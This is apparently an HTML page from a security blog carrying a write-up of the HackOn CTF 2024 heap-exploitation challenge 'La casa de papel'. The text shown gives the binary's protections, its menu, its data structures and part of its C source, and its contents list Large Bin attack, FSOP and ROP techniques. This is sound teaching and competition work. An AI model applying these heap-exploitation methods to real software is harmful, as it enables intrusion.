<!doctype html><html lang="en"><head><title>La casa de papel | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="HackOn CTF 2024. 64-bit binary. Heap exploitation. Large Bin attack. FSOP. Stack Pivot. ROP chain"><meta name="image" content="https://7rocky.github.io/images/pwn.png"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="HackOn CTF 2024. 64-bit binary. Heap exploitation. Large Bin attack. FSOP. Stack Pivot. ROP chain"><meta itemprop="keywords" content><meta itemprop="name" content="La casa de papel"><meta property="article:published_time" content><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="HackOn CTF 2024. 64-bit binary. Heap exploitation. Large Bin attack. FSOP. Stack Pivot. ROP chain"><meta property="og:image" content="https://7rocky.github.io/images/pwn.png"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="La casa de papel"><meta property="og:type" content="website"><meta property="og:url" content="https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="HackOn CTF 2024. 64-bit binary. Heap exploitation. Large Bin attack. FSOP. Stack Pivot. ROP chain"><meta name="twitter:description" content="HackOn CTF 2024. 64-bit binary. Heap exploitation. Large Bin attack. FSOP. Stack Pivot. ROP chain"><meta name="twitter:image" content="https://7rocky.github.io/images/pwn.png"><meta name="twitter:title" content="La casa de papel"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tachyons@4.12.0/css/tachyons.min.css" integrity="sha256-MgEf5i1a74lVzhT+1R6mBbWCUeUaxC8sQTaN5GY+CoI=" crossorigin="anonymous"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/ctf/other/hackon-ctf/la-casa-de-papel/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HACKON CTF</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/&amp;text=La%20casa%20de%20papel" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/ctf/other/hackon-ctf/la-casa-de-papel/&amp;title=La%20casa%20de%20papel" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">La casa de papel</h1><p class="mb4 f6 dib tracked">21 minutes to read</p></header><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#read-function">Read function</a></li><li><a href="#free-function">Free function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#large-bin-attack">Large Bin attack</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#fsop">FSOP</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><p>We are provided with a 64-bit binary called <code>chall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Arch:     amd64-64-little
RELRO:    <span class="code-dark-green">Full RELRO</span>
Stack:    <span class="code-dark-green">Canary found</span>
NX:       <span class="code-dark-green">NX enabled</span>
PIE:      <span class="code-dark-red">No PIE (0x400000)</span>  
</code></pre></div><p>In addition, we have the source code in C. The program is a notes manager with a fairly typical menu:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./chall</span>
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°í‚†¶‚†§‚†§‚†Ñ‚†Ä‚¢Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä  
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚¢á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£†‚¢º‚†Ä‚†Ä‚†í‚†í‚†§‚†§‚†§‚†§‚†§‚£Ä‚£Ä‚£Ä‚£Ä‚†Ä‚†Ä‚†ò‚°á‚†Ä‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚£Ä‚†§‚†î‚†í‚†â‚†Å‚¢Ä‚£º‚°Ä‚†Ä‚¢†‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∞‚°ß‚†ö‚†â‚¢π‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†∞‚£ñ‚†ä‚†â‚†Ä‚†Ä‚†Ä‚£†‚†î‚†ö‚†â‚†Å‚¢Ä‚°á‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢Ä‚°á‚†Ä‚£§‚†Ä‚¢∑‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†à‚†≥‚°Ñ‚†Ä‚†Ä‚†ã‚£†‚†ñ‚†Ç‚°†‚†ñ‚¢ô‚°á‚†Ä‚†à‚†â‚†â‚†â‚†â‚†ì‚†í‚†í‚†í‚†í‚†í‚†Ü‚†Ä‚†Ä‚£∑‚°Ä‚†â‚¢¶‚†Ä‚¢≥‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†à‚¢¶‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚¢Ä‚†º‚°á‚†Ä‚†Ä‚†¶‚†§‚†§‚†Ñ‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†±‚°Ä‚†Ä‚†≥‚°Ä‚†ô‚£Ü‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†≥‚°Ñ‚†Ä‚¢Ä‚°§‚†ä‚†Å‚¢†‚°á‚†Ä‚††‚†§‚¢§‚£Ä‚£Ä‚£Ä‚£Ä‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°ß‚°Ä‚†ô‚¢Ñ‚†Ä‚†±‚†Ñ‚†à‚†≥‚°Ñ‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ô‚°Ñ‚†Ä‚†Ä‚°†‚†î‚¢ª‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚††‚£Ñ‚£Ä‚£Ä‚£Å‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°á‚†±‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚£Ä‚£ò‚£¶
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚£Ü‚†Ä‚†Ä‚†Ä‚°∏‚†Ä‚†Ä‚†∞‚£Ñ‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†à‚†Ä‚†Ä‚†Ä‚°á‚†Ä‚†É‚¢Ä‚£†‚†¥‚†õ‚†â‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚°Ñ‚†Ä‚†Ä‚°á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†â‚†â‚†ô‚†í‚†Ä‚†Ä‚†Ä‚††‚°á‚£†‚†î‚†ã‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†ò‚°Ñ‚¢∏‚†Å‚†Ä‚†Ä‚†Ä‚†í‚†≤‚†§‚£Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚†ü‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†á‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†ë‚†¢‚£Ñ‚†Ä‚†Ä‚†Ä‚†Ä‚¢∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢†‚£é‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†¢‚†§‚£Ä‚†Ä‚†Ä‚†Å‚†Ä‚†Ä‚†Ä‚†∏‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢°‚†â‚†ô‚†í‚†§‚¢§‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†í‚†Ä‚†Ä‚†Ä‚†Ä‚°Ü‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†∏‚†∂‚†í‚†ä‚†â‚†â‚†â‚†ì‚†¶‚£Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚¢∞‚†É‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†≤‚¢Ñ‚°Ä‚†Ä‚†Ä‚°é‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†â‚†≤‚£º‚†Å‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä
‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚°Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä‚†Ä

What would you like to do?
[0] Create new note.
[1] Edit existing note.
[2] Read existing note.
[3] Throw note to the bin.
[4] Exit.
&gt;
</code></pre></div><h2 id="source-code-analysis">Source code analysis</h2><p>First, it is convenient to know that we have the following data structures:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">enum</span><span class="mtk1"> { </span><span class="mtk1">false</span><span class="mtk1">, </span><span class="mtk1">true</span><span class="mtk1"> } </span><span class="mtk8 mtku">bool</span><span class="mtk1">;</span>
<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">enum</span><span class="mtk1"> {</span><span class="mtk1">small</span><span class="mtk1">, </span><span class="mtk1">medium</span><span class="mtk1">, </span><span class="mtk1">large</span><span class="mtk1"> } </span><span class="mtk8 mtku">note_sz</span><span class="mtk1">;</span>  

<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">MAX_NOTES</span><span class="mtk1"> </span><span class="mtk6">4</span>
<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">TAM_TEXT</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">410</span>
<span class="mtk5">#define</span><span class="mtk1"> </span><span class="mtk8">TAM_FOOTER</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">18</span>

<span class="mtk5">typedef</span><span class="mtk1"> </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">t_note</span><span class="mtk1">{</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">text</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">footer</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk1">is_freed</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk1">is_written</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk1">has_been_edited_text</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk1">has_been_edited_footer</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">bool</span><span class="mtk1"> </span><span class="mtk1">has_been_edited_header</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk8 mtku">note_sz</span><span class="mtk1"> </span><span class="mtk1">size</span><span class="mtk1">;</span>
<span class="mtk1">} </span><span class="mtk8 mtku">Note</span><span class="mtk1">, </span><span class="mtk5">*</span><span class="mtk8 mtku">pNote</span><span class="mtk1">;</span>

<span class="mtk8 mtku">Note</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk8">MAX_NOTES</span><span class="mtk1">]; </span>
</code></pre></div><p>We only have 4 notes in which we can have header, text and footer. Some flags also appear in case we write, free or edit any of these fields.</p><h3 id="allocation-function">Allocation function</h3><p>To create notes, we have the function <code>create_note</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span>
<span class="mtk8">create_note</span><span class="mtk1">(){</span>
<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">available</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">available_notes_create</span><span class="mtk1">();</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk5">!</span><span class="mtk1">available</span><span class="mtk1">){</span>
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"There are no pages left to write a new note!</span><span class="mtk6">\n</span><span class="mtk4">"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1">;</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Select the note's index"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk8">print_note_idxs</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1">( (</span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">idx</span><span class="mtk1"> </span><span class="mtk5">&gt;=</span><span class="mtk1"> </span><span class="mtk8">MAX_NOTES</span><span class="mtk1">) </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">text</span><span class="mtk1"> </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_written</span><span class="mtk1"> </span><span class="mtk5">||</span><span class="mtk1"> </span><span class="mtk1">notes</span><span class="mtk1">[</span><span class="mtk1">idx</span><span class="mtk1">].</span><span class="mtk1">is_freed</span><span class="mtk1"> ){</span>  
<span class="mtk1">            </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Invalid index!!"</span><span class="mtk1">);</span>
<span class="mtk1">            </span><span class="mtk5">continue</span><span class="mtk1">;</span>
<span class="mtk1">        } </span>
<span class="mtk1">        </span><span class="mtk5">break</span><span class="mtk1">;</span>
<span class="mtk1">    }</span>

<span class="mtk1">    </span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk1">sz</span><span class="mtk1">;</span>
<span class="mtk1">    </span><span class="mtk5">while</span><span class="mtk1">(</span><span class="mtk1">true</span><span class="mtk1">){</span>
<span class="mtk1">        </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Choose the note size [small: 0, med: 1, big: 2]"</span><span class="mtk1">);</span>
<span class="mtk1">        </span><span class="mtk1">sz</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read_int</span><span class="mtk1">();</span>
